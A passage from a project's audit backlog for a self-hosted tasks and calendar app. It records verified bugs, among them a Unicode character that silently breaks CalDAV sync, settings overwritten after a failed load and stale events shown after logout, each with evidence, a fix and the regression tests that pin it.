#### [x] No frontend test ever renders a clock under the 24-hour setting, so the TimeFormatProvider wiring in ten components is uncovered
`frontend/src/App.test.tsx:413` · **low** · test-gap

`timeformat.tsx` says it outright: "a component rendered outside the provider (every
existing test) formats exactly as it did before", i.e. always the 12h default.
`TimeFormatProvider` is mounted only by App.tsx:629, and the two App-level clock tests
assert nothing but the settings BUTTON's own label text. Ten components call
`useTimeFormat()` (CalendarView, TasksView, TodayView, HomeView, DayPopover, TaskModal,
AddMultipleModal, SchedulingView, ConnectionsSection, ArchivedCalendarsSection) and feed
the result to `fmtClock`/`fmtDue`/`fmtWhen`. The formatters themselves are thoroughly
unit-tested in time.test.ts for both formats, but the wiring between the stored setting
and any rendered time is asserted nowhere: `grep -rn "'24h'" src --include=*.test.ts*`
outside time.test.ts returns only the two App.test.tsx lines below, and
`TimeFormatProvider` appears in no test file.

<details><summary>Evidence</summary>

```
frontend/src/timeformat.tsx:10-12: "The default is the app's historical behaviour, so a component rendered outside the provider (every existing test) formats exactly as it did before."

frontend/src/App.test.tsx:412-418 — the only test that loads a 24h setting:

    it('restores a stored 24-hour choice', async () => {
      m.getSettings.mockResolvedValue({ time_format: '24h' })
      render(<App />)
      await screen.findByRole('button', { name: 'Tasks' })
      await openSettings('General')
      await waitFor(() =>
        expect(screen.getByRole('button', { name: '12- or 24-hour clock' })).toHaveTextContent('24-hour'))
    })

It asserts the label on the toggle, never a rendered time.

Failure scenario: an edit to CalendarView.tsx (or any of the other nine) replaces `const tf = useTimeFormat()` / `fmtClock(iso, tf)` with `fmtClock(iso, DEFAULT_TIME_FORMAT)` — an easy result of untangling a prop-drilling refactor, and one `tsc --noEmit` accepts because both are `TimeFormat`. All 1115 frontend tests still pass, the backend `test_settings_time_format_sync` still passes (it only checks the round-trip), and an account set to 24-hour silently sees `2:05 PM` on every calendar chip while the Settings screen keeps reading "24-hour".
```

</details>

**Suggested fix.** Add one App-level test that mocks `getSettings` to `{ time_format: '24h' }`, seeds an
event/task with a known afternoon time, and asserts the rendered chip matches `/14:05/`
and `not.toMatch(/PM/i)` — plus the 12h control. Better still, a small helper that
renders each `useTimeFormat` consumer inside `<TimeFormatProvider value="24h">` and
asserts no rendered time contains AM/PM, so a new component that forgets the hook fails
immediately.

#### [x] The _at_or_after regression pin asserts only that a bool comes back, so a wrong comparison passes
`backend/tests/test_backlog_stage1.py:143` · **low** · test-gap · minor

The closed finding was a TypeError, and `assert isinstance(_at_or_after(a, anchor),
bool)` does catch that. But it accepts any boolean, and both parametrized cases happen
to be equal instants, so a mixed-awareness branch that returned a constant would satisfy
it. The value under test decides where a series is cut: `_at_or_after` gates
`_drop_overrides` (ical/edit.py:744) and the slot walk at edit.py:769, i.e. which
EXDATE/RDATE/override entries stay with the head and which go to the tail of a 'this and
following' split.

<details><summary>Evidence</summary>

```
tests/test_backlog_stage1.py:133-143:

    @pytest.mark.parametrize("a, anchor", [
        (datetime(2026, 1, 1, 9, 0), datetime(2026, 1, 1, 9, 0, tzinfo=timezone.utc)),
        (datetime(2026, 1, 1, 9, 0, tzinfo=timezone.utc), datetime(2026, 1, 1, 9, 0)),
    ])
    def test_splitting_a_series_survives_a_floating_date_list_entry(a, anchor):
        assert isinstance(_at_or_after(a, anchor), bool)

The implementation it pins (tasksd/ical/edit.py:642-657) falls back to a wall-clock comparison when awareness differs:

    if (a.tzinfo is None) != (anchor.tzinfo is None):
        return a.replace(tzinfo=None) >= anchor.replace(tzinfo=None)

Failure scenario: a later 'tidy-up' decides the mixed-awareness case is unanswerable and returns `False` unconditionally (a plausible reading of 'we cannot compare these'). The test still passes — `False` is a bool, and both of its cases are the equal-instant case where the current answer is `True`, so it does not even notice the flip. In production, a series carrying one floating EXDATE that sits AFTER the split anchor is then classified as 'before', so `_drop_overrides(tail, anchor, keep_before=False)` leaves it on the head and strips it from the tail: the excluded occurrence reappears in every occurrence of the new tail series, silently resurrecting a deleted instance.
```

</details>

**Suggested fix.** Assert the answer, not the type, and include a case where the two orderings differ: e.g.
`assert _at_or_after(naive_0900, aware_0900_utc) is True`, `assert
_at_or_after(naive_0800, aware_0900_utc) is False`, and the mirrored pair — so a
constant-returning or inverted branch fails.

## Sweep — 2026-08-19

A fourth adversarial sweep (22 subsystem finders, two independent verifiers per
finding, ~220 agents). 100 raw findings, **69 survived verification**, 30 were
refuted — a 30% refutation rate. Grounded against every section below, so nothing
here repeats an earlier sweep: the repo began this one with zero open findings.

Three of the 69 are the same defect seen at a different layer, so they are filed
once and the backlog counts **66**. Every one of the ten HIGHs was reproduced by
hand with a runnable probe against a live Radicale 3.7.4 before being written down.

**0 open, 66 closed.** All five stages are done (`docs/STAGES.md`) — the seven
crash paths went first as **Stage 1**, and the rest followed. Every pin that
once asserted a corrected behaviour and failed is now an ordinary regression test
that must stay green; no `xfail(strict=True)` marker remains anywhere in the
suite. Run `pytest -m backlog -rxX` and `npx vitest run backlog` for the
itemised state.

One pattern is worth naming because it accounts for five of them and is why three
prior sweeps missed them: **the code's own comment asserts a safety property the
code does not deliver.** `_u()` in `scheduling.py` documents "Every comparison in
this module must go through here" and the guard ten lines above it did not
(fixed in Stage 3; that line now reads `if _u(end) > _u(start):`).
`sync_all` says a sync failure is recorded "where /api/sync and future tooling can
see it" and nothing reads it. A comment is evidence of intent, not of behaviour.

### CalDAV client & XML

#### [x] One U+FFFE/U+FFFF anywhere in a calendar item permanently and silently kills that collection's sync (XMLSyntaxError escapes the DAV taxonomy from parse_multistatus)

`backend/tasksd/dav/xml.py:264` · **high** · bug · stage 1

`parse_multistatus` calls `etree.fromstring(data)` with no error handling. Radicale copies a resource's iCalendar bytes verbatim into `<C:calendar-data>` using stdlib ElementTree, which does NOT validate characters — so any VTODO/VEVENT whose text carries U+FFFE or U+FFFF makes Radicale emit a perfectly well-formed-looking 207 that lxml refuses (XML 1.0 §2.2 Char forbids exactly those two). `DavClient.multiget` (client.py:302) is the only path that fetches bodies, so the resulting `lxml.etree.XMLSyntaxError` — not a `DavError` — propagates out of `SyncEngine._multiget` for the whole 50-item batch, before `_upsert_body`'s explicit "one malformed foreign write must not wedge the collection's sync forever" guard (engine.py:226) ever runs. `TaskService.sync_all` (service.py:149) swallows it per-collection into `sync_state.last_error`, which no endpoint or UI ever reads, so the failure is completely silent: the sync token never advances and that list/calendar stops receiving ANY change from any other client, forever, while the app keeps looking healthy.

Two reachable triggers. (1) Adversary #2 — Tasks.org/DAVx5/jtx/Thunderbird PUT arbitrary iCalendar into these collections; one such resource freezes the collection immediately. (2) The app's own API: `CreateTask.summary` / `CreateEvent.summary` are unvalidated `str` (see the companion finding), so the owner pasting text containing U+FFFE creates the poison itself. In case (2) the freeze is dormant — the item is already cached with a matching etag, so `full_resync`'s `to_fetch` skips it — and detonates on the first cache rebuild, which is the repo's own documented recovery for a disposable cache (invariant #1). A rebuild then recovers **zero** items from that collection.

Note the test that pins this: `tests/test_dav_xml.py:184` (`test_malformed_xml_raises_an_lxml_syntax_error`) asserts the crash and reasons it away — "the callers all sit behind `_request`, which has already required a 207, so this only fires on a server that answered 207 with rubbish." That rationale is false: Radicale answers a valid 207 whose *payload* contains a character XML cannot carry. AUDIT.md:1420 closed this as a test gap and its own suggested fix said "assert whatever the chosen contract is — preferably a DavError, which requires wrapping etree.fromstring"; the wrap was never done. AUDIT.md:1469 fixed the same character class only on the WRITE side (`_text`, xml.py:186) — the read side has no equivalent.

<details><summary>Evidence</summary>

```
Reproduced against Radicale 3.7.8 with the repo's own SyncEngine.

A foreign client writes one ordinary VTODO:

    SUMMARY:groceries \ufffe        # PUT by httpx directly, not by this app -> 201 Created

Then, using the real DavClient + SyncEngine + SQLite cache:

    clean sync: SyncStats(upserted=0, removed=0, full_resync=True, last_error=None)
    foreign PUT: 201
    sync 0 -> XMLSyntaxError PCDATA invalid Char value 65534, line 7, column 19
    sync 1 -> XMLSyntaxError PCDATA invalid Char value 65534, line 7, column 19
    sync 2 -> XMLSyntaxError PCDATA invalid Char value 65534, line 7, column 19
    full   -> XMLSyntaxError PCDATA invalid Char value 65534, line 7, column 19
    # a second foreign task ("milk") is then added:
    cached summaries now: ['normal task', 'created after the poison']   # "milk" never arrives

Self-inflicted variant, entirely through this app's API (summary: str is unvalidated):

    e1.create_task(col.href, "notes \ufffe pasted from a PDF")   # succeeds, 201
    e1.sync(...)  -> OK              # dormant: etag matches, multiget never fetches it
    # invariant #1 "the cache is disposable" — rebuild from an empty DB:
    rebuild from empty cache -> XMLSyntaxError PCDATA invalid Char value 65534
    items recovered: 0

A full codepoint sweep (0x00-0x1F, 0x7F, 0x85, 0x9F, 0xFDD0, 0xFFFE, 0xFFFF, 0x1FFFE, 0x1FFFF) through PUT -> GET -> multiget shows C0 controls are stripped by Radicale/icalendar on write and every other candidate round-trips fine; exactly U+FFFE and U+FFFF survive the PUT and break the parse:

    BREAKING CODEPOINTS: ['0xfffe', '0xffff']

`sync_collection` (getetag only) and PROPFIND are unaffected — only `multiget`, i.e. every body fetch, both incremental and full resync.
```

</details>

**Suggested fix.** Wrap the parse so the transport layer can only raise its own taxonomy, and make one poisoned resource cost one resource rather than the whole collection: (a) in `parse_multistatus`, build the parser explicitly and catch — `parser = etree.XMLParser(resolve_entities=False, no_network=True, huge_tree=False, recover=True)`; `try: root = etree.fromstring(data, parser) except etree.XMLSyntaxError as e: raise DavError(f"unparseable multistatus: {e}") from e`. With `recover=True` libxml2 drops the offending character and the rest of the batch still parses, so the poisoned item degrades to a body that `_upsert_body` then handles through its existing malformed-resource path (counted in `stats.skipped`, which correctly suppresses `gc_orphans`). (b) Have `SyncEngine._multiget` fall back to per-href `dav.get()` (raw bytes, no XML) for a batch that fails, so a resource Radicale cannot represent in XML is still cacheable. (c) Add a `tests/test_dav_xml.py` case built from real Radicale-shaped bytes containing `\ufffe` inside `<C:calendar-data>` asserting the chosen contract, and delete the false rationale on `test_malformed_xml_raises_an_lxml_syntax_error`.

**Pinned by** `test_a_body_xml_cannot_carry_stays_inside_the_dav_taxonomy` in `backend/tests/test_backlog_aug19_stage1.py`.

#### [x] summary/notes/location/description reach Radicale with no character guard, so the app can write a value its own read path cannot parse — the XML-safe rule is applied only to collection names

`backend/tasksd/app.py:145` · **medium** · bug · stage 1

`xml.py:124-129` states the XML-safe character rule "has to hold in three places at once — the HTTP edge (app.CollectionName), the MCP tool schemas, and this backstop" because "widening it in one place silently drifted the others". That rule is enforced on exactly one field. `CollectionName` (app.py:81-84) carries `pattern=XML_SAFE_PATTERN_SCALAR` and the MCP collection-name schema (mcp/tools.py:86) carries `XML_SAFE_PATTERN` — but every other user string that ends up inside an iCalendar resource is a bare `str`: `CreateTask.summary`/`notes` (app.py:145-146), `EditTask.summary`/`notes` (app.py:184-185), `CreateEvent.summary`/`location`/`description` (app.py:222-227), `EditEvent.*` (app.py:233-235), `tags`, and the matching MCP schemas (`{"type": "string", "minLength": 1}` at tools.py:269, 291, 426, 455) which carry no pattern at all.

The collection name is the field that CANNOT break anything — it travels as PROPPATCH XML that `_text` (xml.py:186) already backstops, and lxml would refuse it at build time. The task/event fields are the ones that can: they are serialized into iCalendar, PUT as `text/calendar` (no XML involved, so no backstop fires), stored by Radicale, and then read back through `<C:calendar-data>` inside a multistatus — where U+FFFE/U+FFFF are unrepresentable and kill the parse. So the guard is on the harmless field and absent on the dangerous one, which is what turns the companion `parse_multistatus` finding from "a hostile foreign client can do this" into "the owner does it by pasting text from a PDF or a Windows app into a task title". Because the item is cached at create time with a matching etag, nothing surfaces until the cache is rebuilt — the repo's own documented recovery — at which point that collection recovers nothing.

Secondary: none of these fields has a `max_length` either, while `CollectionName` is capped at 200. A summary is bounded only by `max_body_bytes` and is then re-serialized into every `/api/lists`, `/api/tasks` and MCP response.

<details><summary>Evidence</summary>

```
app.py:81-84 (guarded):

    CollectionName = Annotated[
        str,
        Field(min_length=1, max_length=200, pattern=XML_SAFE_PATTERN_SCALAR),
    ]

app.py:144-151 (unguarded, same request surface):

    class CreateTask(BaseModel):
        summary: str
        notes: str | None = None
        ...
        tags: list[str] | None = None

mcp/tools.py:269 (unguarded) vs tools.py:86 (guarded):

    "summary": {"type": "string", "minLength": 1, "description": "The task title."},
    # vs
    "type": "string", "minLength": 1, "maxLength": 200, "pattern": XML_SAFE_PATTERN,

Concrete failure, driven through the real service/engine against Radicale 3.7.8:

    POST /api/lists/{id}/tasks  {"summary": "notes \ufffe pasted from a PDF"}
      -> 201, task created and visible; every sync keeps succeeding.
    Later, after `rm tasks.db` (invariant #1: "the cache is disposable") or after any
    other client touches that item so its etag changes:
      SyncEngine.sync(collection)  -> lxml.etree.XMLSyntaxError:
                                      PCDATA invalid Char value 65534
      items recovered from that collection: 0   (permanently, until the item is deleted)

The same request rejected with a 422 if the character is put in the list NAME instead — which is the field that could not have caused any harm.
```

</details>

**Suggested fix.** Apply the rule where it actually matters: give `summary`, `notes`, `description`, `location` and each element of `tags` the same `Annotated[str, Field(max_length=..., pattern=XML_SAFE_PATTERN_SCALAR)]` treatment `CollectionName` already gets (one shared alias, e.g. `ICalText`, so the three copies stay in step as the xml.py comment demands), and add `"pattern": XML_SAFE_PATTERN` to the corresponding MCP tool schemas at mcp/tools.py:269, 291, 426, 455. Add a case to tests/test_security.py alongside the existing builder test asserting that `POST /api/lists/{id}/tasks` with `"summary": "x\ufffe"` is a 422, not a 201 — the current suite only exercises the collection-name path.

**Pinned by** `test_a_task_summary_cannot_carry_what_the_read_path_cannot_parse` in `backend/tests/test_backlog_aug19_stage1.py`.

### Frontend core

#### [x] A failed GET /api/settings is swallowed silently, and the next preference gesture overwrites the account's stored settings with the shipped defaults

`frontend/src/App.tsx:203` · **high** · bug · stage 3

The settings bootstrap ends in `.catch(() => { /* keep the locally-cached theme + appearance */ })`. The comment is only true for the two settings that have a localStorage mirror. The other eleven — `hidden_calendars`, `archived_calendars`, `hidden_lists`, `task_groups`, `collapsed_groups`, `collapsed_tasks`, `dashboard`, `calendar_task_lists`, `tab_order`, `start_tab`, `tasks_view` — have no mirror, so a single failed read leaves them at their shipped defaults (`[]` / DEFAULT_TAB_ORDER) with no toast, no error state, no retry (the effect only re-runs on an `auth` transition; a `rev` bump does not re-run it), and no way for the user to tell. Every mutator then composes its PUT from that empty local state (`onArchivedCalendarsChange([...archivedCalendars, id])` at CalendarView.tsx:470, `onGroupsChange([...(groups ?? []), {…}])` at Sidebar.tsx:186, `onHiddenChange([...hidden, id])` at Sidebar.tsx:165), so the first archive / group / hide after the failed load replaces the account's whole stored array with one element. This is the read-side twin of the already-fixed write-side finding ("All settings writes swallow every failure, including 401") and of the `listsOk` hardening in data.tsx — both of those added a real-fetch gate, and this path never got one. A 401 here is swallowed too, so a session that lapses between /api/me and /api/settings leaves the app claiming to be signed in.

<details><summary>Evidence</summary>

```
App.tsx:140-203
  useEffect(() => {
    if (auth !== 'in') return
    api.getSettings()
      .then((s) => { …setArchivedCals / setTaskGroups / setHiddenLists / setDashboard… })
      .catch(() => { /* keep the locally-cached theme + appearance */ })
  }, [auth, applyTheme])

Verified against the real App with only ./api mocked (temp vitest file, since deleted):
  m.getSettings.mockRejectedValue(new HttpError(502, 'bad gateway'))
  -> toast shown: false
  -> strip: ['Home','Tasks','Calendar','Scheduling']   // the account's saved tab_order is gone
  -> click 'Move Calendar left'
  -> putSettings calls: [[{"tab_order":["home","calendar","tasks","scheduling"]}]]   // default-derived, written back
  m.getSettings.mockRejectedValue(new AuthError('unauthenticated'))
  -> sign-in shown after 401 settings: false ; toast: null

Concrete loss: the owner has 5 archived calendars and 3 sidebar groups. /api/settings 502s once through the tunnel during a backend restart while /api/me (served from a warm worker) succeeds. All 5 archived calendars reappear on the grid and all 3 groups vanish from the sidebar with no explanation. The owner archives one calendar again -> PUT {archived_calendars: ['c9']} -> the other four are permanently gone from the account, as are the three groups the moment a new group is created.
```

</details>

**Suggested fix.** Give the read the same treatment the write path already has: on `AuthError` call `setAuth('out')`; on any other failure `showToast("Couldn't load your preferences — changes won't be saved until this reloads")` and set a `settingsOk` flag that the settings mutators check before PUTting a whole-array key (or hold the writes / retry the GET). Mirroring the `listsOk` pattern from data.tsx is the smallest consistent fix. Add an App.test.tsx case that rejects `getSettings` and asserts the failure is visible and that a subsequent gesture does not PUT a default-derived array.

**Pinned by** `aug19 stage 3 — a failed settings read > does not write a defaults-derived preference back over the account` in `frontend/src/backlog.aug19.stage3.test.tsx`.

#### [x] Logout does not clear the in-memory data mirror, so the calendar keeps painting the previous session's events and never refetches them

`frontend/src/data.tsx:505` · **medium** · security · stage 3

`onLogout` deliberately calls `clearCache()` + `setCacheUser('')` (App.tsx:434-436) so the disk mirror cannot outlive a session — cache.ts is carefully user-keyed and version-keyed for exactly this. But `DataProvider` sits *above* the auth branch on purpose (App.tsx:461) and therefore never unmounts, and nothing resets its state when `enabled` goes false: `CalendarProvider`'s `cals`, `windows`, `asked` and `gen` (data.tsx:502-550) survive logout intact. On the next login `CalendarView` remounts, `eventsFor` hits `windows` and paints the previous session's rows, and `requestWindow` short-circuits because `asked.get(key)` still equals `${rev}|${calIds}` — so the month is never refetched at all. `TaskProvider` does refetch (its effects list `enabled` as a dep), which makes the calendar's behaviour an inconsistency rather than a design. In the multi-user reading of the threat model this serves account A's events to account B; in the single-user one it means "log out at night, log back in in the morning" shows a frozen snapshot that misses everything DAVx5/Apple wrote overnight.

<details><summary>Evidence</summary>

```
data.tsx:502-577 — CalendarProvider holds `windows`, `asked`, `gen`, `cals`; no effect or branch clears them when `enabled` flips to false.
App.tsx:432-437
  const onLogout = async () => { try { await api.logout() } catch … ; clearCache(); setCacheUser(''); setAuth('out') }

Proven against the real App with only ./api mocked (temp vitest file, since deleted), start_tab 'calendar':
  1. sign in as 'alice'; api.events resolves [{summary:'ALICE SECRET'}] -> chip rendered, api.events called 1x
  2. Settings > Account > Log out  (clearCache() runs, login card shows)
  3. sign in as 'bob'; api.events now resolves []
  stdout: events calls before logout: 1  after re-login: 1      // never re-requested
          ALICE SECRET still on screen: true
No App.test.tsx case renders a view across a logout/login cycle, so the suite is green.
```

</details>

**Suggested fix.** Reset the provider state when the session goes away. In `CalendarProvider` (and `TaskProvider` for symmetry) add `useEffect(() => { if (enabled) return; setWindows(new Map()); setCals([]); asked.current.clear(); gen.current.clear(); seeded.current = null; setLoaded(false) }, [enabled])`, or bump a `session` counter in App on every auth transition and key the providers on it. Add a test that logs out and back in and asserts `api.events` is called again and the old event is gone.

**Pinned by** `aug19 stage 3 — logging out and back in > does not paint the previous session’s events to the next one` in `frontend/src/backlog.aug19.stage3.test.tsx`.

#### [x] A failed events fetch permanently records the month as "asked", so the calendar grid stays blank or stale with no retry path

`frontend/src/data.tsx:576` · **medium** · bug · `minor` · stage 4

`requestWindow` writes the window into `asked` *before* the fetch is issued (data.tsx:576) and short-circuits any later request while `rev` and the calendar set are unchanged (data.tsx:575). `fetchWindow` only ever deletes from `gen`'s bookkeeping and `inflight`; nothing removes the `asked` entry when the guarded fan-out rejects. `Promise.all(forCals.map(c => api.events(c.id, from, to)))` rejects if any single calendar's request fails, so one 502 through the tunnel leaves the window recorded as fetched with nothing in `windows`, and `eventsFor` falls back to `seeded` — the disk mirror (last session's rows, or empty on a fresh browser). This is the exact residual of the already-closed finding "The events staleness guard is global, not per window": the fix made the generation per-window but never implemented the belt-and-braces `asked.current.delete(key)` its own suggested-fix text called for, so the error path still reaches the same dead end. Note `inflight` is maintained (data.tsx:556,562) and never read — the bookkeeping for a recovery that was never wired up.

<details><summary>Evidence</summary>

```
data.tsx:552-577
  const fetchWindow = useCallback((from, to, forCals) => {
    const key = windowKey(from, to)
    const mine = (gen.current.get(key) ?? 0) + 1
    gen.current.set(key, mine)
    inflight.current.add(key)                       // never read anywhere
    void guard(async () => {
      const per = await Promise.all(forCals.map((c) => api.events(c.id, from, to)))
      …
    }).finally(() => inflight.current.delete(key))  // <- no asked.current.delete on failure
  }, [guard])
  const requestWindow = useCallback((from, to, forCals) => {
    …
    if (asked.current.get(key) === stamp) return
    asked.current.set(key, stamp)                   // <- recorded before the fetch can fail
    fetchWindow(from, to, forCals)
  }, [rev, enabled, fetchWindow])

Proven against the real modules (copy of the CalendarView harness, TZ=America/New_York, system time 2026-03-05, temp vitest file since deleted):
  m.events.mockRejectedValueOnce(new Error('502 bad gateway')).mockResolvedValue([marchEvent])
  1. mount on March -> api.events called 1x, rejects, toast raised, grid empty
  2. click '>' to April  -> api.events called 2x (April fetch succeeds)
  3. click '<' back to March
  stdout: events call count after back: 2      // NO third request
          March visible: false                 // the month is blank forever
Only an SSE data event, archiving a calendar, or an event edit (`reload`) ever recovers it. CalendarView.test.tsx:301 covers the superseded-window case and stops there; nothing covers a rejected fetch.
```

</details>

**Suggested fix.** Make `asked` reflect only successful fetches. In `fetchWindow`, have the guarded body return a sentinel and drop the record when the guard swallowed a failure: `void guard(async () => { …; setWindows(…); return true }).then((ok) => { if (ok === undefined) asked.current.delete(key) }).finally(() => inflight.current.delete(key))`. (Also delete the key when a response is dropped as superseded.) Add a CalendarView test that rejects the first `api.events`, navigates away and back, and asserts a third call plus the event on screen.

**Fixed** as the suggested fix describes, with one deliberate difference: the
superseded branch returns `true` as well, so a stale-but-successful response does
NOT un-ask a window a newer fetch is already handling. `undefined` from
`makeGuard`'s catch is the only signal that means "this failed", and clearing on
every settle would re-request on every fast page-turn. The write-only `inflight`
ref went with it — three writes, no reads.

The pin was widened first, in both directions: a SECOND failure on the same
window must also recover (the original passed against a repair that recovers
once), and a window that succeeded must NOT be re-requested when the user pages
back to it. Run against a half-fix that deletes the record unconditionally, the
pin still fails on that second half.

**Pinned by** `2026-08-19 — the calendar grid > re-requests a month whose first fetch failed` in `frontend/src/backlog.aug19.stage4a.test.tsx`.

#### [x] An SSE reconnect that 401s retries forever, so a session that lapses while the tab is idle is never detected

`frontend/src/api.ts:475` · **low** · bug · stage 4

The comment above `subscribe` names the case explicitly — "a 401 once the session TTL lapses" — and the handling it describes is an unbounded, capped-backoff reconnect loop. But `EventSource` exposes no status, so a 401 is indistinguishable from a 502 and `onExpire` is never reached from this path. Nothing else in the SPA polls, and `rev` only advances on an SSE frame, so a tab whose session expires while the user is only reading keeps showing the last-rendered data indefinitely while firing an unauthenticated GET /api/events every 30 s forever. Every other fetch path in the app routes a 401 to the guard; this is the one that cannot, and the comment is what makes it read as covered.

<details><summary>Evidence</summary>

```
api.ts:454-486
  es.onerror = () => {
    missed = true
    if (es && es.readyState !== EventSource.CLOSED) return
    es?.close(); es = null
    if (stopped) return
    const backoff = Math.min(_SSE_MAX_BACKOFF_MS, 1000 * 2 ** attempts)
    attempts++
    retry = setTimeout(open, backoff * (0.5 + Math.random() / 2))   // no give-up, no auth probe
  }
`subscribe(onChange)` takes no onExpire and has no way to report one.

Trigger: TASKS_SESSION_TTL default is 7 days; a tab left open over a long weekend passes it. systemd restarts tasksd (or the tunnel reconnects), the established stream drops, the reconnect answers 401, readyState is CLOSED -> the loop retries every ~30 s for the life of the page. The user sees Friday's tasks and calendar with no staleness chrome and no login card; only a deliberate write finally produces a 401 that a guard can see. api.test.ts:124 drives `hardFail()` and asserts the retry, which is the same code path — nothing asserts anything about auth.
```

</details>

**Suggested fix.** Give `subscribe` an expiry signal: after N consecutive hard failures (or on every failure past the first), probe `api.me()` and, on `AuthError`, call an `onExpire` callback App can wire to `setAuth('out')` and stop the loop. At minimum surface a "live updates disconnected" indicator so a frozen tab is visible.

**Fixed** as suggested: `subscribe` takes an optional `onExpire`, counts
consecutive hard failures, and after three probes `api.me()` — stopping the loop
and reporting up only on an `AuthError`. Three and not one because one hard
failure is an ordinary blip, and probing on it would also fire an unmocked
`fetch` inside `api.test.ts`, which drives exactly one. `App.tsx` passes the
`onExpire` it already holds, moved above the SSE effect.

**The pin was NARROWED, not just widened, and that is the substantive decision
here.** It previously blessed either repair — probe, or "give up and surface a
live-updates-disconnected state" — and asserted `probed || gaveUp`. The second
outcome is not reachable: `subscribe` takes one callback and has no channel to
surface UI state, so "gave up" means a silently frozen tab, which is the finding.
The docstring was rewritten to say so rather than left to be quietly outgrown.

The control matters more than the pin: with the probe answering **200** the loop
must keep reconnecting and must sign nobody out. A server that is down is not a
session that is gone, and logging a live session out on one 502 from the tunnel
would be worse than the bug being fixed — and no pin would notice, since the pin
only asks that `onExpire` fires.

A later review pointed out that the sentence above named a case the control did
not drive: a probe answering **200** is the server saying the session is fine,
which is the easy half. When the server is really down the probe does not answer
at all — `api.me()` REJECTS, with an `HttpError` for a 5xx the tunnel
synthesises or a `TypeError` for a socket that never opened, neither of them an
`AuthError` and neither of them evidence about the session. `onExpire` on any
probe rejection passed everything. Two more controls now drive exactly that, so
the sentence and the tests say the same thing.

**Pinned by** `aug19 stage 4b — an SSE reconnect that 401s > discovers a session that lapsed while the tab was idle` in `frontend/src/backlog.aug19.stage4b.test.tsx`.

#### [x] The login form's two labels are not associated with their inputs, so both fields are unlabelled — the one form in the app that gets this wrong

`frontend/src/components/Login.tsx:34` · **low** · rendering · `minor` · stage 4

`<label className="label">Username</label>` and `<label className="label">Password</label>` are siblings of their inputs with no `htmlFor`, no `id`, and no `aria-label`, and they do not wrap the inputs. Both controls therefore have no accessible name: a screen reader announces "edit text, blank" and "password edit, blank", and clicking either label does not focus its field. Every other form in the app pairs them correctly — TaskModal.tsx:137,153 (`htmlFor="task-title"` / `"task-notes"`), CalendarView.tsx:876-925 (eight `htmlFor`/`id` pairs), TabsSection.tsx:58, AppearancePanel.tsx:270 — so this is an isolated miss on the only page an unauthenticated visitor ever sees. Login.test.tsx works around it rather than catching it: it reaches the fields with `screen.getAllByRole('textbox')[0]` and `document.querySelector('input[type="password"]')` instead of `getByLabelText`, which is exactly the query that would fail today. *(The fix left that workaround standing next to the new pin; a later review flagged it, and `fields()` now reaches both inputs by their accessible name — unwiring either `htmlFor` fails four existing tests, not just the pin.)*

<details><summary>Evidence</summary>

```
Login.tsx:33-42
  <div className="field">
    <label className="label">Username</label>
    <input className="input" value={username} autoFocus autoComplete="username" … />
  </div>
  <div className="field">
    <label className="label">Password</label>
    <input className="input" type="password" value={password} autoComplete="current-password" … />
  </div>

Login.test.tsx:19-23
  function fields() {
    const [username] = screen.getAllByRole('textbox')
    const password = document.querySelector('input[type="password"]') as HTMLInputElement
    …
  }
`screen.getByLabelText('Username')` throws "Unable to find a label with the text of: Username" against this markup, while the identical query succeeds for every field in TaskModal and the event modal.
```

</details>

**Suggested fix.** Add the pairs the rest of the app already uses: `<label className="label" htmlFor="login-user">Username</label>` / `<input id="login-user" …>` and `<label className="label" htmlFor="login-pass">Password</label>` / `<input id="login-pass" type="password" …>`, then switch Login.test.tsx's `fields()` to `getByLabelText` so the association is what the test depends on.

**Fixed** with the `htmlFor`/`id` pairs the rest of the app already uses.
Half-fix checked: `htmlFor` with no matching id, which `getByLabelText` still
refuses. Not asserted: that clicking the label focuses the input — jsdom's
label-to-control forwarding is not a reliable oracle for focus, and pinning it
would be pinning the test environment rather than the app.

**Pinned by** `aug19 stage 4b — the login form > gives both fields an accessible name` in `frontend/src/backlog.aug19.stage4b.test.tsx`.

#### [x] loadKey encodes list ORDER, so a sidebar drag-reorder refetches every task in the account and discards the fetch already in flight

`frontend/src/data.tsx:180` · **low** · bug · `minor` · stage 4

`loadKey` is built as `` `*|${lists.map(l => l.id).join(',')}` `` — order-sensitive — and it is both a dependency of the task fan-out effect (data.tsx:198) and the commit guard for every in-flight response (`key === keyRef.current`, data.tsx:194). The sidebar's drag-reorder calls `onItems(next)` with the same list ids in a new order (Sidebar.tsx:158 -> `setLists`), which changes `loadKey` even though the set of lists is identical. Two things follow: the effect re-runs and issues one `api.tasks()` per list for data that cannot have changed, and any response already in flight fails the `key === keyRef.current` check and is thrown away. `api.reorderLists` then publishes a collections change over SSE, bumping `rev` and buying a second full fan-out. This is the same waste class as the already-fixed "Every settings write triggers a full lists+tasks refetch" finding, reached through list order instead of `rev`. Rename/recolor (Sidebar.tsx:120) does not change ids and correctly does not refetch, which shows the identity is meant to be the *set*.

<details><summary>Evidence</summary>

```
data.tsx:180-206
  const loadKey = `*|${lists.map((l) => l.id).join(',')}`   // <- order is part of the identity
  const keyRef = useRef(loadKey); keyRef.current = loadKey
  useEffect(() => {
    …
    const key = loadKey
    guard(async () => {
      const per = await Promise.all(lists.map((l) => api.tasks(l.id)))
      if (token === fetchToken.current && key === keyRef.current) setTasks(ts)
    })…
  }, [loadKey, rev, enabled, listsLoaded])

Sidebar.tsx:147-159 (drop)
  const next = [...items]; const [moved] = next.splice(from, 1); next.splice(to, 0, moved)
  onItems(next)                       // same ids, new order -> setLists -> loadKey changes
  api.reorder(next.map((l) => l.id))

Scenario: 8 task lists, an SSE-driven refetch is 400 ms into its fan-out. The user drags 'Errands' above 'Work' purely to tidy the sidebar. loadKey changes -> the 8 responses in flight are discarded on arrival, 8 fresh GET /api/lists/{id}/tasks are issued, and the reorder's own collections_changed bump issues 8 more — 24 requests, all re-reading SQLite under the global service lock, for a change that moved nothing.
```

</details>

**Suggested fix.** Key on the list *set*, not its order: `const loadKey = `*|${[...lists.map((l) => l.id)].sort().join(',')}``. Nothing downstream depends on order (the fan-out is `Promise.all` and the result is flattened, then sorted at render by `sortTasks`). Add a data/TasksView test that reorders the sidebar and asserts `api.tasks` is not called again.

**Fixed** by sorting the ids in `loadKey` itself, and the location matters more
than the change: both consumers — the effect's dependency and the in-flight
commit guard — read that one constant. Sorting only the dependency would stop the
refetch while leaving the guard order-sensitive, so a response already on the
wire would be discarded with nothing left to re-issue it: strictly worse than the
bug being fixed.

That half-fix is exactly what was run, and it is caught — not by the pin, which
still passes against it, but by a CONTROL added alongside: `keeps a task fetch
that was in flight when the order changed`. That control is green today (the
